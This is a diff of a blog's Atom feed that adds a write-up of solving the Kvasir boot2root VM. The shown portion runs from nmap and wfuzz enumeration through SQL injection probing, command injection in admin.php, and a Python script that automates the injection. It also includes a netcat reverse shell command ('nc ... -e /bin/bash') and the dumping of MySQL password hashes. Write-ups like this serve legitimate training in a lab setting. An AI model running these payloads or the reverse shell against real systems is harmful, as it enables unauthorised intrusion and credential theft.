@@ -4,7 +4,7 @@
   <title><![CDATA[#!/slash/note]]></title>
   <link href="http://leonjza.github.io/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2014-11-05T05:56:02+02:00</updated>
+  <updated>2014-11-10T08:50:53+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -12,6 +12,2428 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[solving kvasir - netcat edition]]></title>
+    <link href="http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/"/>
+    <updated>2014-11-09T10:27:09+02:00</updated>
+    <id>http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition</id>
+    <content type="html"><![CDATA[<h2>introduction</h2>
+
+<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>
+
+<p><img class="right" src="https://i.imgur.com/gHw2Q50.gif"> Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>
+
+<p>This writeup details the path I took to read the final flag :)</p>
+
+<!-- more -->
+
+
+<h2>a usual start</h2>
+
+<p>Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>
+
+<p>With that out the way, lets start.<br/>
+Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged <em>lazy mode</em>™ and checked what the VirtualBox session showed the IP was:</p>
+
+<p><img src="https://i.imgur.com/ZTj0D3h.png"></p>
+
+<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.102
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 11:07 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.102
+</span><span class='line'>Host is up <span class="o">(</span>0.000061s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 999 closed ports
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>MAC Address: 08:00:27:CF:5D:57 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 0.20 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>fink ur gud enuf?</h2>
+
+<p>Browing to the IP using Iceweasel, we see a login portal presented to us:</p>
+
+<p><img src="https://i.imgur.com/vUSSRt7.png"></p>
+
+<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>
+
+<p><img src="https://i.imgur.com/gVb0iK7.png"></p>
+
+<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>
+
+<p><img src="https://i.imgur.com/mAxhkaG.png"></p>
+
+<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>
+
+<p><img src="https://i.imgur.com/o9Utreq.png"></p>
+
+<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>
+
+<p><img src="https://i.imgur.com/DA1Xe5H.png"></p>
+
+<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php
+</span><span class='line'>
+</span><span class='line'>********************************************************
+</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
+</span><span class='line'>********************************************************
+</span><span class='line'>
+</span><span class='line'>Target: http://192.168.56.102/FUZZ.php
+</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
+</span><span class='line'>
+</span><span class='line'>Total requests: <span class="nv">1660</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
+</span><span class='line'><span class="o">==================================================================</span>
+</span><span class='line'>
+</span><span class='line'>00077:  <span class="nv">C</span><span class="o">=</span>302     16 L        34 W      365 Ch    <span class="s2">&quot; - admin&quot;</span>
+</span><span class='line'>00302:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      294 Ch    <span class="s2">&quot; - cgi-bin/&quot;</span>
+</span><span class='line'>00394:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - create&quot;</span>
+</span><span class='line'>00455:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      294 Ch    <span class="s2">&quot; - descarga&quot;</span>
+</span><span class='line'>00457:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      296 Ch    <span class="s2">&quot; - descarrega&quot;</span>
+</span><span class='line'>00463:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      298 Ch    <span class="s2">&quot; - descarregues&quot;</span>
+</span><span class='line'>00741:  <span class="nv">C</span><span class="o">=</span>200     20 L        44 W      464 Ch    <span class="s2">&quot; - index&quot;</span>
+</span><span class='line'>00894:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      290 Ch    <span class="s2">&quot; - load&quot;</span>
+</span><span class='line'>00901:  <span class="nv">C</span><span class="o">=</span>302      0 L         0 W        0 Ch    <span class="s2">&quot; - login&quot;</span>
+</span><span class='line'>00904:  <span class="nv">C</span><span class="o">=</span>302      0 L         0 W        0 Ch    <span class="s2">&quot; - logout&quot;</span>
+</span><span class='line'>00964:  <span class="nv">C</span><span class="o">=</span>302     15 L        16 W      168 Ch    <span class="s2">&quot; - member&quot;</span>
+</span><span class='line'>01247:  <span class="nv">C</span><span class="o">=</span>200     17 L        39 W      426 Ch    <span class="s2">&quot; - register&quot;</span>
+</span><span class='line'>01331:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - select&quot;</span>
+</span><span class='line'>01432:  <span class="nv">C</span><span class="o">=</span>200      0 L         0 W        0 Ch    <span class="s2">&quot; - submit&quot;</span>
+</span><span class='line'>01556:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      292 Ch    <span class="s2">&quot; - update&quot;</span>
+</span><span class='line'>01565:  <span class="nv">C</span><span class="o">=</span>403     10 L        30 W      293 Ch    <span class="s2">&quot; - updates&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woa, thats quite a bit of results to work through eh :)</p>
+
+<h2>admins only want to 302 here</h2>
+
+<p>Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>
+
+<p><img src="https://i.imgur.com/exdmq5A.png"></p>
+
+<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>
+
+<p><img src="https://i.imgur.com/6WoT1x2.png"></p>
+
+<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>
+
+<h2>command injection</h2>
+
+<p>In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s1">&#39;http://192.168.56.102/admin.php&#39;</span> --data <span class="s1">&#39;service=apache2;&#39;</span>
+</span><span class='line'>
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;div <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Service Check&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;form <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;&quot;</span>&gt;
+</span><span class='line'>&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;service&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;apache2&quot;</span> /&gt;&lt;br /&gt;&lt;br /&gt;
+</span><span class='line'>&lt;input <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Submit&quot;</span> /&gt;
+</span><span class='line'>&lt;/form&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;logout.php&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span>&gt;
+</span><span class='line'>&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Logout&quot;</span> /&gt;
+</span><span class='line'>&lt;/form&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;Usage: /etc/init.d/apache2 <span class="o">{</span>start<span class="p">|</span>stop<span class="p">|</span>graceful-stop<span class="p">|</span>restart<span class="p">|</span>reload<span class="p">|</span>force-reload<span class="p">|</span>start-htcacheclean<span class="p">|</span>stop-htcacheclean<span class="p">|</span>status<span class="o">}</span>.
+</span><span class='line'>&lt;/pre&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;/etc/init.d/&quot;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;service&quot;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; status&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl <span class="s1">&#39;http://192.168.56.102/admin.php&#39;</span> --data <span class="s1">&#39;service=;echo `id`;&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>&lt;pre&gt;uid<span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span><span class='line'>&lt;/pre&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>netcat is our entry into the rabbit hole</h2>
+
+<p>With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Kvasir Command Execution</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># $ python cmd.py &quot;uname -a&quot;</span>
+</span><span class='line'><span class="c"># Command to run: uname -a</span>
+</span><span class='line'><span class="c"># </span>
+</span><span class='line'><span class="c"># Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;Command to run: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># generate 2 random strings so that we can regex out the command output</span>
+</span><span class='line'><span class="n">command_start</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
+</span><span class='line'><span class="n">command_end</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># prepare something that we can regex out</span>
+</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;service&#39;</span> <span class="p">:</span> <span class="s">&#39;;echo </span><span class="si">%s</span><span class="s">; echo `</span><span class="si">%s</span><span class="s">`; echo </span><span class="si">%s</span><span class="s">;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">command_start</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">command_end</span><span class="p">)</span> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#fetch, ignoring the troll redirect</span>
+</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://192.168.56.102/admin.php&#39;</span><span class="p">,</span> <span class="n">params</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#match regex and print</span>
+</span><span class='line'><span class="k">print</span>  <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;</span><span class="si">%s</span><span class="s">([^|]+)</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">command_start</span><span class="p">,</span> <span class="n">command_end</span><span class="p">),</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="si">%s</span><span class="se">\n</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">command_end</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, now I can just run <code>python cmd.py "id"</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# python cmd.py <span class="s2">&quot;id&quot;</span>
+</span><span class='line'>Command to run: id
+</span><span class='line'>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvp 4444
+</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
+</span><span class='line'>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
+</span><span class='line'>connect to <span class="o">[</span>192.168.56.101<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.102<span class="o">]</span> 53516
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>
+
+<p><img src="https://i.imgur.com/Q2rSi2G.png"></p>
+
+<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>
+
+<h2>my-see-qual as root deserves a slap on the wrist</h2>
+
+<p>With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;member&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: index.php&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">&quot;192.168.2.200&quot;</span><span class="p">,</span> <span class="s2">&quot;webapp&quot;</span><span class="p">,</span> <span class="s2">&quot;webapp&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class='line'><span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;webapp&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT dob FROM users WHERE username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">[... snip ...]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;show grants;&#39;</span>
+</span><span class='line'>Grants <span class="k">for </span>webapp@192.168.2.100
+</span><span class='line'>GRANT SELECT, INSERT ON *.* TO <span class="s1">&#39;webapp&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span> IDENTIFIED BY PASSWORD <span class="s1">&#39;*BF7C27E734F86F28A9386E9759D238AFB863BDE3&#39;</span>
+</span><span class='line'>GRANT ALL PRIVILEGES ON <span class="sb">`</span>webapp<span class="sb">`</span>.* TO <span class="s1">&#39;webapp&#39;</span>@<span class="s1">&#39;192.168.2.100&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I can select anywhere. Nice :)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use webapp; show tables;&#39;</span>
+</span><span class='line'>Tables_in_webapp
+</span><span class='line'>todo
+</span><span class='line'>users
+</span><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use webapp; select * from todo;&#39;</span>
+</span><span class='line'>task
+</span><span class='line'>stop running mysql as root
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql -uwebapp -pwebapp -h 192.168.2.200 -e <span class="s1">&#39;use mysql; select DISTINCT User,Password from user;&#39;</span>
+</span><span class='line'>User    Password
+</span><span class='line'>root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
+</span><span class='line'>debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
+</span><span class='line'>webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
+</span></code></pre></td></tr></table></div></figure>
+
+
